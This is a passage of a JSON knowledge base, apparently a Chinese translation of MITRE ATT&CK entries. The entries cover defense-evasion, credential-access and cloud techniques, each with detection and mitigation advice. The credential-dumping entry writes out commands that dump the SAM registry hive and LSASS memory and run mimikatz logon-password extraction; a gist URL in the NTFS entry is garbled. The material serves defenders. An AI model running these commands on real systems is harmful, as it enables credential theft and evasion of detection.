		"detection": "<p>注册表的修改是正常的，在Windows操作系统的典型使用过程中都会发生。考虑对特定键启用注册表审核，以便在值发生更改时生成警报事件（事件4657）（尽管使用reghide或其他规避方法创建值时可能不会触发此事件）。更改注册表项以便Windows启动时加载与已知软件、补丁周期等不相关的软件是可疑的，在启动文件夹中添加或修改文件也是可疑的。更改还可能包括创建新服务和修改现有二进制路径来指向恶意文件。如果更改了与服务相关的条目，则随后很可能启动或重启本地或远程服务以执行文件。</p><p>监控进程和命令行参数来检测注册表信息更改或删除动作。带有内置功能的远程访问工具可以直接与Windows API交互以收集信息。还可以通过Windows系统管理工具（如Windows Management Instrumentation和PowerShell）来获取信息。如果使用了这些工具，可能还需要在操作系统中配置日志功能，以便收集必要的信息用于分析。</p><p>监控与隐藏注册表项（如Reghide）相关联的进程、命令行参数和API调用。调用原生Windows API和/或使用Autoruns、RegDelNull 等工具检查和清除恶意隐藏注册表项。</p>",
		"mitigations": [{
			"name": "注册表权限限制",
			"description": "确保为注册表配置单元设置了适当的权限，防止用户修改系统组件的键来提升权限。"
		}],
		"tactics": ["TA0005"]
	},
	"name": "注册表修改"
}, {
	"id": "T1126",
	"description": "<p>不需要Windows共享驱动器和Windows管理共享连接时，可以删除它们。NET是一个示例实用工具，它可以通过<code>net use \\system\\share /delete</code>命令来删除网络共享连接。</p><p>攻击者可以删除无用的共享连接，从而清除其操作痕迹。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["管理员", "用户"],
		"dataSources": ["进程监控", "进程命令行参数", "网络抓包", "认证日志"]
	},
	"relations": {
		"detection": "<p>网络共享连接可能很常见，具体取决于网络环境的使用方式。监控<code>net use</code>命令（与通过SMB建立和删除远程共享相关）的命令行调用，遵循检测Windows管理共享的最佳实践。系统之间的SMB通信量也可以被捕获和解码以查找相关的网络共享会话和文件传输活动。Windows身份认证日志可用于确定何时及通过哪个账号建立了认证的网络共享，并且可用于将网络共享活动与其他事件相关联来研究潜在的恶意活动。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0005"]
	},
	"name": "网络共享连接删除"
}, {
	"id": "T1096",
	"description": "<p>每个新技术文件系统（NTFS）格式的分区都包含一个主文件表（MFT），它为分区上的每个文件/目录维护一个记录。MFT条目中是文件属性，如扩展属性（EA）和数据（存在不止一个数据属性时称为备用数据流（ADSS）），可用于存储任意数据（甚至完整的文件）。</p><p>攻击者可能会将恶意数据或二进制文件存储在文件属性元数据中，而不是直接存储在文件中。这可能是为了逃避一些防御措施，如静态指示扫描工具和杀毒软件。</p>",
	"details": {
		"platform": ["Windows"],
		"dataSources": ["文件监控", "内核驱动程序", "API监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>存在用来识别NTFS EA中存储信息的取证技术。监控对Windows API函数ZwSetEaFile和ZwQueryEaFile的调用以及对用于与EA交互的二进制文件的调用，并考虑定期扫描是否存在修改过的信息。</p><p>有很多方法可以通过Windows实用程序创建ADSs并与之交互。监控带冒号文件名的操作（执行，复制等）。此语法（例如：<code>file.ext:ads[.ext]</code>）通常与ADSs关联。对于可用于执行和创建ADSs的实用工具列表，请参阅HTTPS://GIST.GITHUBCOM/API0CRADLY/CDD2D0EC9ABB66F0E89306E27 7B8F。</p><p>Sysinternals的Streams工具可以打开带ADSs的文件。<code>dir/r</code>命令也可以用来显示ADSs。许多PowerShell命令（如Get-Item、Set-Item、Remove-Item和Get-ChildItem）也可以接受<code>-stream</code>参数来与ADSs交互。</p>",
		"mitigations": [{
			"name": "文件和目录权限限制",
			"description": "请考虑调整NTFS EA的读写权限。不过应该对其进行测试，以确保不会妨碍操作系统的常规操作。"
		}],
		"tactics": ["TA0005"]
	},
	"name": "NTFS文件属性"
}, {
	"id": "T1027",
	"description": "<p>攻击者可能会试图通过加密、编码或其他方式混淆系统或传输中的内容，使得难以发现或分析可执行文件。这种操作很常见。攻击者可以跨不同平台和网络做此操作来规避防御。</p><p>有效负载可以压缩、存档或加密，从而避免被发现。这些负载可在初始访问期间或之后使用，以减少检测。有时，可能需要用户执行操作来打开文件才能去模糊化或解密。可能还会需要用户输入密码来打开攻击者提供的用密码保护的压缩/加密文件。攻击者也可能使用压缩或归档的脚本，比如Javascript。</p><p>也可以对文件的部分内容编码，隐藏明文字符串，以避免防御程序发现它们。有效负载也可能被分割成单独的、看似善意的文件，这些文件只在重新组装时才会显现其恶意功能。</p><p>攻击者也可能混淆从有效负载或直接通过命令行界面执行的命令。环境变量、别名、字符和其他平台/语言特定语义可以用来规避基于签名的检测和白名单机制。</p><p>混淆的另一个示例是使用隐写术，这是一种将消息或代码隐藏在图像、音轨、视频剪辑或文本文件中的技术。已知和报告的最早应用隐写术的攻击者之一使用的是Invoke-PSImage。Duqu恶意软件对从受害者系统中收集到的信息进行了加密，并将其隐藏到一个图像中，然后将该图像传输到C2服务器。2017年底，一个攻击者团体通过Invoke-PSImage将PowerShell命令隐藏在图像文件（png）中，并在受害者的系统上执行代码。在这种特殊情况下，PowerShell代码下载了另一个混淆脚本，用这个脚本从受害者的机器中收集情报并将其传达回攻击者。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["网络协议分析", "网络进程使用", "文件监控", "恶意软件逆向工程", "二进制文件元数据", "进程命令行参数", "环境变量", "进程监控", "Windows事件日志", "网络入侵检测系统", "电子邮件网关", "SSL/TLS检查"]
	},
	"relations": {
		"detection": "<p>文件混淆的检测是困难的，除非混淆后的产物是用签名唯一可检测的。如果无法检测到混淆本身，则有可能检测到导致混淆文件的恶意活动（例如，在文件系统上写入、读取或修改文件）。</p><p>标记并分析包含混淆指示符和已知可疑语法（例如未解释的转义字符'''^'''和'''\"'''）的命令。Windows的Sysmon和事件4688显示进程的命令行参数。去混淆工具可用于检测文件/有效负载中的这些指示符。</p><p>可以在网络上检测到有效负载中出于首次访问目的的混淆。使用网络入侵检测系统和电子邮件网关过滤来识别压缩和加密的附件和脚本。某些电子邮件附件轰炸系统可以打开压缩和加密的附件。从某网站通过加密连接传递的有效负载需做加密网络流量检查。</p>",
		"mitigations": [{
			"name": "杀毒软件",
			"description": "考虑利用Windows 10上的防恶意软件扫描接口（AMSI）来分析处理和解释后的命令。"
		}],
		"tactics": ["TA0005"]
	},
	"name": "混淆文件或信息"
}, {
	"id": "T1186",
	"description": "<p>Vista中引入了Windows事务NTFS（TxF）作为执行安全文件操作的方法。为确保数据完整性，TxF只允许一个事务处理句柄在给定时间写入文件。在写入句柄事务终止之前，所有其他句柄都与编写器隔离，并且只能读取打开句柄时存在的文件的已提交版本。为避免损坏，如果系统或应用程序在写入事务期间发生故障，TxF会执行自动回滚。</p><p>尽管已弃用，但从Windows 10开始，仍启用了TxF应用程序编程接口（API）。</p><p>攻击者可能会利用TxF来执行进程注入技术的无文件变体“Process Doppelgänging”。与\"进程替换\"类似，Process Doppelgänging涉及替换合法进程的内存，以便能够隐晦地执行恶意代码并逃避防御和检测。Process Doppelgänging对TxF的使用还避免了使用被高度监控的API函数，如NtUnmapViewOfsection、VirtualProtectEx和SetThreadContext。</p><p>Process Doppelgänging通过4个步骤实现：</p><p>·         事务处理 – 使用合法的可执行文件创建TxF事务，然后用恶意代码覆盖文件。这些更改将被隔离，并且仅在本次事务的上下文中可见。</p><p>·         加载 – 创建内存的共享区域并加载恶意可执行文件。</p><p>·         回滚 – 撤销对原始可执行文件的更改，有效地从文件系统中删除恶意代码。</p><p>·         启动 – 从内存的受污染部分创建进程并启动执行。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["管理员", "系统", "用户"],
		"dataSources": ["API监测", "进程监测"]
	},
	"relations": {
		"detection": "<p>监控和分析对CreateTranscation，CreateFileTransacted，RollbackTransaction以及其它很少使用但表示有TxF活动的函数的调用。ProcessDoppelgänging还通过调用NtCreateProcessEx，NtCreateThreadEx，以及用来在其它进程中修改内存的API（比如：WriteProcessMemory）来调用Windows进程加载程序的过时且未记录的实现。</p><p>扫描在PsSetCreateProcessNotifyRoutine期间报告的文件对象（每当创建或删除进程时，该文件对象都会触发回调），特别是查找启用写入访问权限的文件对象。还应考虑将内存中加载的文件对象与磁盘上的相应文件进行比较。</p><p>分析进程行为以确定进程是否执行了通常不执行的操作，例如打开网络连接、读取文件或与攻击后行为相关的其他可疑操作。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0005"]
	},
	"name": "进程Doppelgänging"
}, {
	"id": "T1093",
	"description": "<p>进程替换指的是挂起状态下创建的进程内存被取消映射且替换为恶意代码。与进程注入类似，恶意代码的执行在合法进程下被屏蔽且可能逃避防御和检测分析。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["进程监控", "API监控"]
	},
	"relations": {
		"detection": "<p>监控API调用可能会生成大量数据而且可能无法直接用于防御，除非是在特定情况下为已知的错误调用序列收集数据。因为API函数的使用往往是善意的，很难与恶意行为区分开来。进程替换过程中可能会调用ZwUnmapViewOfSection、NtUnmapViewOfSection等API来取消进程内存映射，也会调用WriteProcessMemory等API来修改其它进程的内存。</p><p>分析进程行为来确定流程是否正在执行其通常不执行的操作，例如打开网络连接，读取文件或其他可疑的入侵后操作。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0005"]
	},
	"name": "进程替换"
}, {
	"id": "T1536",
	"description": "<p>在执行恶意活动试图躲避检测以及移除云实例存在的证据之后，攻击者可能会还原对云实例所做的更改。在高度虚拟化环境（如：云化基础设施）中，很容易通过云管理仪表盘从虚拟机或数据存储快照恢复数据。此技术的另外一个变体是使用连接到计算实例的临时存储。大多数云提供商提供各种类型的存储，包括持久、本地和/或临时存储，后者通常在虚拟机停止/重启时重置。</p>",
	"details": {
		"platform": ["AWS", "GCP", "Azure"],
		"permissionRequired": ["管理员", "用户"],
		"dataSources": ["Azure操作系统日志", "AWS CloudTrail日志", "Azure活动日志", "Stackdriver日志", "AWS操作系统日志"]
	},
	"relations": {
		"detection": "<p>建立实例活动的集中日志记录。即使在还原到快照、回滚更改或更改存储持久性/类型之后，也可以基于这些日志记录来监控和检查系统事件。专门监控正常活动以外的与快照、回滚和虚拟机配置更改相关的事件。为了减少误报，可在有效更改管理过程中引入一个已知标识符（如果云提供商支持，该标识符将与更改操作一起记录），来帮助区分有效的预期操作与恶意操作。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0005"]
	},
	"name": "还原云实例"
}, {
	"id": "T1014",
	"description": "<p>Rootkit程序通过拦截（即hooking）和修改提供系统信息的操作系统API调用来隐藏恶意软件的存在。操作系统的用户，内核或更低层级可能会有rootkit或启用rootkit功能，以包括监控程序，主引导记录或系统固件。</p><p>攻击者可能使用rootkit来隐藏程序、文件、网络连接、服务、驱动程序和其他系统组件的存在。已经在Windows，Linux和Mac OS X系统上观察到rootkit。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"permissionRequired": ["管理员", "系统", "root用户"],
		"dataSources": ["BIOS", "MBR", "系统调用"]
	},
	"relations": {
		"detection": "<p>杀毒软件或操作系统软件中可能会内置某些rootkit保护。有专门的rootkit检测工具，用于查找特定类型的rootkit行为。监控是否存在无法识别的DLL、设备、服务和MBR的更改。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0005"]
	},
	"name": "Rootkit"
}, {
	"id": "T1045",
	"description": "<p>软件加壳是一种压缩或加密可执行文件的方法。攻击者可能会通过对可执行文件来加壳更改文件签名，试图规避基于签名的检测。大多数解压缩技术都是解压缩内存中的可执行代码。</p><p>用来给软件加壳的实用程序称为加壳程序，比如MPRESS和UPX。有一个很全面的已知加壳程序列表，但攻击者可能会建立并使用自己的加壳技术来躲避防御，不会像其它知名加壳程序那样留下过程产物。</p><p>攻击者可能会使用虚拟机软件保护作为软件打包的一种形式来保护他们的代码。虚拟机软件保护将可执行文件的原始代码转换为只有特定虚拟机才能运行的特殊格式。然后虚拟机会被调用来运行此代码。</p>",
	"details": {
		"platform": ["Windows", "macOS"],
		"dataSources": ["二进制文件元数据"]
	},
	"relations": {
		"detection": "<p>使用文件扫描来查找已知的软件加壳程序或加壳技术的相关物。加壳动作不是恶意活动的明确指示，因为合法软件也可能会使用加壳技术来减小二进制文件大小或保护专有代码。</p>",
		"mitigations": [{
			"name": "杀毒软件",
			"description": "采用启发式恶意软件检测。确保已经更新病毒定义并为观察到的恶意软件创建自定义签名。"
		}],
		"tactics": ["TA0005"]
	},
	"name": "软件加壳"
}, {
	"id": "T1099",
	"description": "<p>Timestomping技术用于修改文件时间戳（修改，访问，创建和更改次数），通常是模拟同一文件夹中的文件。比如，攻击者在自己修改或创建的文件上使用Timestomping技术后，这些文件对于取证调查人员或文件分析工具而言不会很明显。Timestomping技术可能会与文件名伪装技术一起使用来隐藏恶意软件和工具。</p>",
	"details": {
		"platform": ["Linux", "Windows"],
		"permissionRequired": ["用户", "管理员", "系统"],
		"dataSources": ["文件监控", "进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>存在取证技术来检测已修改时间戳文件的各个方面。可以通过文件修改监控来检测timestomping行为。文件修改监控可以收集有关文件句柄打开的信息并可以比较时间戳值。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0005"]
	},
	"name": "Timestomp工具"
}, {
	"id": "T1535",
	"description": "<p>攻击者可能会在未使用的地理服务区域内创建云实例来躲避检测。攻击者通常通过入侵云基础设施管理账户来获得访问权限。</p><p>云服务提供商通常会在全局范围内提供基础设施来提高性能、提供冗余并允许客户满足合规要求。通常，客户只会使用可用区域的一部分，而且不会主动监控其他区域。如果攻击者在未使用的区域内创建资源，则他们能在不被发现的情况下进行操作。</p><p>此行为的变体利用了云区域之间的功能差异。攻击者可能会利用不支持先进检测服务的区域来避免他们的活动被检测到。例如，并非每个区域都支持AWS GuardDuty。</p><p>例如，攻击者在未使用的AWS区域通过资源劫持来挖掘加密货币。这可能会导致组织在一段时间内损失大量资金，具体取决于处理能力。</p>",
	"details": {
		"platform": ["AWS", "GCP", "Azure"],
		"permissionRequired": ["用户"],
		"dataSources": ["Stackdriver日志", "Azure活动日志", "AWS CloudTrail日志"]
	},
	"relations": {
		"detection": "<p>监控系统日志以查看所有云环境和区域内发生的活动。将警报功能配置为通知正常使用区域中的活动，或者如果区域中活动的实例数超过某个阈值则发送通知。</p>",
		"mitigations": [{
			"name": "软件配置",
			"description": "云服务提供商可能允许客户停用未使用的区域。"
		}],
		"tactics": ["TA0005"]
	},
	"name": "未使用/不支持的云区域"
}, {
	"id": "T1497",
	"description": "<p>攻击者可能会检查是否存在虚拟机环境（VME）或沙盒，以避免他们的工具和行为被检测到。如果攻击者检测到VME，他们可能会更改其恶意软件以隐藏植入物的核心功能或脱离受害者。他们还可能在丢弃次要或其他有效负载之前搜索VME产物。攻击者可能会在自动发现过程中使用从虚拟化/沙箱逃逸中学到信息来决定后续行为。</p><p>攻击者可能会使用包括安全软件发现在内的多种方法，通过搜索安全监控工具（例如Sysinternals、Wireshark等）来逃避虚拟化/沙盒检测，从而确定它是否是分析环境。其他方法包括在恶意软件代码中使用睡眠计时器或循环，以避免在临时沙盒中进行操作。</p><p>虚拟机环境产物发现</p><p>攻击者可能会使用Windows管理规范、PowerShell、Systeminfo和Query Registry等实用程序来获取系统信息和搜索VME产物。攻击者可能会在内存、进程、文件系统和/或注册表中搜索VME产物。攻击者可能会使用脚本编写技术将这些检查合并到一个脚本中，然后在确定系统为虚拟环境时退出程序。此外，在VMWare等应用程序中，攻击者可以使用特殊的I/O端口发送命令和接收输出。攻击者也可以检查驱动器大小。例如，可以使用Win32设备I/O控制功能来完成此操作。</p><p>注册表中的VME产物示例：</p><p>·         <code>HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions</code></p><p>·         <code>HKLM\\HARDWARE\\Description\\System\\\"SystemBiosVersion\";\"VMWARE\"</code></p><p>·         <code>HKLM\\HARDWARE\\ACPI\\DSDT\\BOX_</code></p><p>系统上的VME文件和DLL示例：</p><p>·         <code>WINDOWS\\system32\\drivers\\vmmouse.sys</code></p><p>·         <code>WINDOWS\\system32\\vboxhook.dll</code></p><p>·         <code>Windows\\system32\\vboxdisp.dll</code></p><p>常规检查可以枚举这些应用程序所独有的运行的服务、系统上安装的程序、与虚拟机应用程序相关的字符串的制造商/产品字段以及特定于VME的硬件/处理器指令。</p><p>用户活动发现</p><p>攻击者可能会搜索主机上用户活动（例如，浏览器历史记录、缓存、书签、主目录中的文件数等），以确保是真实环境。他们可能会通过用户交互和数字签名来检测此类信息。他们可能会有恶意软件检查鼠标单击的速度和频率，以确定是否是沙盒环境。在激活恶意代码之前，其他方法可能依赖于与系统的特定用户交互。例如，在激活宏之前等待文档关闭，以及等待用户双击嵌入的图像以激活它。</p><p>虚拟硬件指纹发现</p><p>攻击者可能会检查系统的风扇和温度，从而收集可以指示虚拟环境的证据。攻击者可能会利用一条WMI查询语句<code>$q = \"Select * from Win32_Fan\" Get-WmiObject -Query $q</code>进行一次CPU检查。如果这条WMI查询语句的结果返回的元素数大于0，则可能告诉他们此机器是一台物理机器。</p>",
	"details": {
		"platform": ["Windows", "macOS"],
		"dataSources": ["进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>虚拟化、沙盒和相关发现技术可能在操作的第一步中发生，但也可能在攻击者了解环境的整个过程中发生。不应孤立地看待数据和事件，而应将其视为可能导致其他活动的一系列行为中的一部分，例如横向移动。检测与虚拟化和沙盒识别相关的操作可能很困难，具体取决于攻击者所需要的实现和监控方法。监控正在生成的、收集各种系统信息或执行其他形式发现技术的可疑进程（尤其是在短时间内）可能有助于检测。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0005", "TA0007"]
	},
	"name": "虚拟化/沙箱逃逸"
}, {
	"id": "T1102",
	"description": "<p>攻击者可能会使用现有的合法外部web服务作为将命令中继到以攻破系统的手段。</p><p>这些命令还可以包括指向命令与控制（C2）基础结构的指针。攻击者可能会在使用嵌入式（通常是经过混淆/编码的）域或IP地址的web服务上发布内容，称为死点解析器。一旦感染，受害者将会到达并被这些解析器重定向。</p><p>作为C2机制的流行网站和社交媒体可能会提供大量掩护，因为网络中的主机可能在入侵前已经与它们通信了。攻击者更容易在常见服务（例如Google或Twitter提供的服务）中隐藏自己。Web服务提供商通常使用SSL / TLS加密，反而为攻击者提供了额外的保护。</p><p>使用web服务还可以保护后端C2基础结构免被通过恶意软件二进制分析而发现，同时还可以实现操作弹性（因为该基础结构可以动态更改）。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["主机网络接口", "Netflow/Enclave技术网络流分析", "网络协议分析", "网络抓包", "SSL/TLS检查"]
	},
	"relations": {
		"detection": "<p>与已知或可疑进程活动（通过网络连接）相关的主机数据很重要，它们可用于补充基于恶意软件命令的攻击指标，也可用于控制签名以及基础结构或强加密的出现。如果数据已加密，则网络抓包分析需要SSL / TLS检查。分析网络数据中不常见的数据流（例如，客户端发送的数据明显多于从服务器接收的数据）。用户行为监控可能有助于检测异常活动模式。分析数据包内容以检测未遵循所用端口预期协议行为的通信。</p>",
		"mitigations": [{
			"name": "网络入侵防护",
			"description": "使用通过网络签名识别特定攻击者恶意软件流量的网络入侵检测和防御系统来缓解网络级别的活动影响。"
		}, {
			"name": "Web内容限制",
			"description": "使用web代理来实施外部网络通信策略，防止使用未经授权的外部服务。"
		}],
		"tactics": ["TA0011", "TA0005"]
	},
	"name": "Web服务"
}, {
	"id": "T1506",
	"description": "<p>攻击者可以使用盗取的会话cookie来验证web应用程序和服务。由于会话已通过验证，此技术绕过了某些多因子认证协议。</p><p>用户通过服务验证后，通常会在web应用程序（包括云化服务）中使用验证cookie，因此无需传递凭据，也无需频繁重复验证。Cookie通常会在很长一段时间内有效，即使没有积极使用的web应用程序。窃取web会话cookie后，攻击者将cookie导入他们控制的浏览器中，并且只要会话cookie处于活动状态，便能够以用户身份使用该站点或应用程序。一旦登录到站点，攻击者就可以访问敏感信息，阅读电子邮件或执行遭入侵账户才有权执行的操作。</p><p>已知一些恶意软件盗取会话cookie绕过多因子认证系统的例子。</p>",
	"details": {
		"platform": ["Office 365", "SaaS"],
		"dataSources": ["认证日志", "Office 365账户日志"]
	},
	"relations": {
		"detection": "<p>监控不同位置的同一用户或不满足预期配置的不同系统对网站和云化应用程序的异常访问。</p>",
		"mitigations": [{
			"name": "软件配置",
			"description": "配置浏览器或任务以定期删除持久cookie。"
		}],
		"tactics": ["TA0005", "TA0008"]
	},
	"name": "Web会话Cookie"
}, {
	"id": "T1139",
	"description": "<p>Bash使用“history”实用程序跟踪用户在命令行上键入的命令。用户注销后，会将历史记录刷新到用户的<code>.bash_history</code>文件中。对于每个用户，该文件位于相同的位置<code>：</code><code>~/.bash_history</code>。通常，该文件会跟踪用户的最近500条命令。用户通常在命令行上键入用户名和密码作为程序的参数，而后在注销时将会被保存到该文件中。攻击者可能会查看该文件来获取可能的凭据。</p>",
	"details": {
		"platform": ["Linux", "macOS"],
		"permissionRequired": ["用户"],
		"dataSources": ["文件监控", "进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>当用户的<code>.bash_history</code>被读取时，对其进行监控，可以帮助提醒可疑活动。尽管用户往往会依赖于他们的命令历史，但他们经常通过其他实用程序（如“history”）而不是像<code>cat ~/.bash_history</code>这样的命令来访问此历史记录。</p>",
		"mitigations": [{
			"name": "操作系统配置",
			"description": "有多种方法可以防止将用户的命令历史记录刷新到其.bash_history文件，包括使用以下命令：用set +o history和set -o history命令重新开始记录日志；将unset HISTFILE添加到用户的.bash_rc文件中；以及用ln -s /dev/null ~/.bash_history命令将命令记录写入/dev/null。"
		}],
		"tactics": ["TA0006"]
	},
	"name": "Bash历史"
}, {
	"id": "T1522",
	"description": "<p>攻击者可能会尝试访问云实例元数据API，从而收集凭据和其它敏感数据。</p><p>大多数云服务提供商都支持云实例元数据API，这是提供给运行中虚拟实例的服务，允许应用程序访问运行中虚拟实例相关信息。可用信息通常包括名称、安全组以及其它元数据，包括敏感数据（如凭据）和可能包含其它机密的UserData脚本。提供实例元数据API是为了方便管理应用程序，任何可以访问该实例的人都可以访问该API。</p><p>运行中虚拟实例上的攻击者可能会直接访问实例元数据API来识别授予其它资源访问权限的凭据。此外，攻击者可能利用面向公众的web代理中的服务器请求伪造（SSRF）漏洞，调用实例元数据API发送请求，从而获取敏感信息的访问权限。</p><p>跨云服务提供商的实际标准是在<code>http[:]//169.254.169.254</code>上托管实例元数据API。</p>",
	"details": {
		"platform": ["AWS", "GCP", "Azure"],
		"permissionRequired": ["用户"],
		"dataSources": ["Azure活动日志", "AWS CloudTrail日志", "认证日志"]
	},
	"relations": {
		"detection": "<p>·         监控对实例元数据API的访问，并查找异常查询。</p><p>·         可能会检测到攻击者使用他们所获取到的凭据。更多信息，请参见“有效账户”。</p>",
		"mitigations": [{
			"name": "网络流量过滤",
			"description": "使用基于主机的防火墙限制对实例元数据API的访问。正确配置的web应用程序防火墙（WAF）可能有助于防止外部攻击者利用服务器端请求伪造（SSRF）漏洞来访问云实例元数据API。"
		}],
		"tactics": ["TA0006"]
	},
	"name": "云实例元数据API"
}, {
	"id": "T1003",
	"description": "<p>凭据导出是从操作系统和软件获取账号登录名和密码（哈希或明文密码）信息的过程。然后可以使用凭据来执行横向移动并访问受限制的信息。</p><p>攻击者和专业安全测试人员都可能会使用此技术中提到的几种工具。也可能存在其他自定义工具。</p><p>Windows</p><p><b>安全账户管理器（SAM</b><b>）</b></p><p>SAM是一个数据库文件。该文件包含主机的本地账号（通常是用“net user”命令找到的账号）。要枚举SAM数据库，需要系统级别的访问权限。可使用多种工具通过内存技术来检索SAM文件，包括：</p><p>·         pwdumpx.exe</p><p>·         gsecdump</p><p>·         Mimikatz</p><p>·         secretsdump.py</p><p>或者，可以使用Reg从注册表中提取SAM：</p><p>·         <code>reg save HKLM\\sam sam</code></p><p>·         <code>reg save HKLM\\system system</code></p><p>然后，可以使用Creddump7在本地处理SAM数据库来检索哈希。</p><p><b>注意：</b>Rid 500账号是本地内置管理员的账号。Rid501是访客账号。用户账号的RID为1,000+。</p><p><b> </b></p><p><b>缓存的凭据</b></p><p>Windows Vista和更高版本使用的域缓存凭据版本2（DCC2）哈希在域控制器不可用时缓存凭据。默认缓存凭据的数量各不相同，此数量在每个系统中都可能变化。此哈希不允许Pass the Hash攻击。可以使用多种工具通过内存技术来检索SAM文件，包括：</p><p>·         pwdumpx.exe</p><p>·         gsecdump</p><p>·         Mimikatz</p><p>或者，可以使用reg.exe从注册表中提取文件，使用Creddump7收集凭据。</p><p><b>注意：</b>Windows Vista的缓存凭据是通过PBKDF2得到的。</p><p><b>LSA Secrets</b></p><p>以系统权限访问主机时，本地账号到域账号的凭据通常都可以用来访问LSA secrets。LSA secrets存储在注册表中。服务运行在本地或域用户的上下文中时，他们的密码存储在注册表中。如果启用了自动登录功能，则此信息也存储在注册表中。可以使用多种工具通过内存技术来检索SAM文件，包括：</p><p>·         pwdumpx.exe</p><p>·         gsecdump</p><p>·         Mimikatz</p><p>·         secretsdump.py</p><p>或者，可以使用reg.exe从注册表中提取文件，使用Creddump7收集凭据。</p><p><b>注意</b>：这种机制提取的密码是UTF-16编码的，也就是说它们是以明文形式返回的。Windows 10新增了对LSA secrets的保护，具体参见“缓解”。</p><p><b>来自域控制器的NTDS</b></p><p>活动目录存储域成员（包括设备和用户）相关信息，用于验证凭据和定义访问权限。活动目录域数据库存储在NTDS.dit文件中。默认情况下，NTDS文件位于域控制器的%SystemRoot%\\NTDS\\Ntds.dit中。</p><p>下列工具和技术可用于枚举NTDS文件和整个活动目录哈希的相关内容：</p><p>·         卷影复制</p><p>·         secretsdump.py</p><p>·         Windows内置工具ntdsutil.exe</p><p>·         Invoke-NinjaCopy</p><p><b> </b></p><p><b>GPP</b><b>文件</b></p><p>组策略首选项（GPP）工具允许管理员用内置的凭据来创建域策略。这些策略，除其他特殊情况外，允许管理员设置本地账号。</p><p>这些组策略存储在域控制器上的SYSVOL中，这意味着任何域用户都可以查看SYSVOL共享并解密密码（AES私钥已在线泄漏）。</p><p>以下工具和脚本可用于从组策略首选项XML文件中收集和解密密码文件：</p><p>·         Metasploit的攻击后模块：\"post/windows/gather/credentials/gpp\"</p><p>·         Get-GPPPassword</p><p>·         gpprefdecrypt.py</p><p><b>注意</b>：在SYSVOL共享上，可用dir / s *.xml命令来枚举XML文件。</p><p><b> </b></p><p><b>服务主要名称 (SPNs)</b></p><p>参见 Kerberos活动目录攻击。</p><p><b> </b></p><p><b>明文凭据</b></p><p>用户登录到系统后，将生成各种凭据并将其存储在内存中的安全机构子系统服务（LSASS）进程中。管理用户或系统用户可以收集这些凭据。</p><p>安全支持提供程序接口（SSPI）是多个安全支持提供程序（SSP）的通用接口：SSP是动态链接库，它给应用提供了一个或多个可用安全包。</p><p>以下SSP可用于访问凭据：</p><p>MAV：交互式登录、批量登录和服务登录通过MSV认证包完成。Wdigest：摘要认证协议设计用于超文本传输协议（HTTP）和简单认证安全层（SASL）交换。Kerberos：在Windows 2000及更高版本中，是客户端-服务器彼此身份认证的首选。CredSSP：为远程桌面服务提供SSO和网络级别认证。以下工具可用于枚举凭据：</p><p>·         Windows Credential Editor</p><p>·         Mimikatz</p><p>与内存技术一样，LSASS进程内存也可以从目标主机转储并在本地系统上进行分析。</p><p>例如，在目标主机上使用procdump：</p><p>·         <code>procdump -ma lsass.exe lsass_dump</code></p><p>在本地，可以运行mimikatz：</p><p>·         <code>sekurlsa::Minidump lsassdump.dmp</code></p><p>·         <code>sekurlsa::logonPasswords</code></p><p><b> </b></p><p><b>DCSync</b></p><p>DCSync是凭据导出技术的一种变体，可用于从域控制器获取敏感信息。该操作不是执行可识别的恶意代码，而是通过滥用域控制器的API模拟来自远程域控制器的复制过程。域控制器上Administrators，Domain Admins，Enterprise Admin群组的任何成员或计算机账号都可以运行DCSync来从活动目录提取密码数据，其中可能包括潜在有用账号（例如KRBTGT和管理员）的当前和历史哈希。然后，这些哈希又可以用于创建“票据传递攻击”会用到的“黄金票据”，或用于更改“账号操纵”中提到的账号密码。Mimikatz的lsadump模块中已包含DCSync功能。Lsadump模块还包括NetSync，它通过旧版复制协议执行DCSync。</p><p>Linux</p><p><b>Proc</b><b>文件系统</b></p><p>Linux上的/proc文件系统包含正在运行操作系统状态相关的大量信息。以root权限运行的进程可以使用此功能来抓取其他正在运行程序的实时内存。如果这些程序中的任何一个以明文形式存储密码或在内存中存储密码哈希，则这些值可能会被收集使用或用于暴力破解攻击。此功能已在MimiPenguin中实现。MimiPenguin是受Mimikatz启发的开源工具。该工具转储进程内存，然后通过查找文本字符串和正则表达式模式来收集密码和哈希，从而了解给定的应用程序（例如Gnome Keyring，sshd和Apache）如何使用内存来存储身份认证相关信息。</p>",
	"details": {
		"platform": ["Windows", "Linux", "macOS"],
		"permissionRequired": ["管理员", "系统", "root"],
		"dataSources": ["API监控", "进程监控", "PowerShell日志", "进程命令行参数"]
	},
	"relations": {
